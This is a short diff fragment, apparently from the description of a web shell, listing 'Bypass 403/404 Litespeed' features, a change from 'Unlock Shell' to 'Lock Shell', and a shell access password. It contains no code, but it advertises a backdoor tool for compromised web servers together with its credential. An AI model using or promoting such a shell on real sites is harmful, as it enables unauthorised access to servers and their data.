@@ -8,7 +8,7 @@ Bypass 403 Litespeed
 
 Bypass 404 Litespeed
 
-Unlock Shell
+Lock Shell
 
 shell password : sergeykarjakin
 
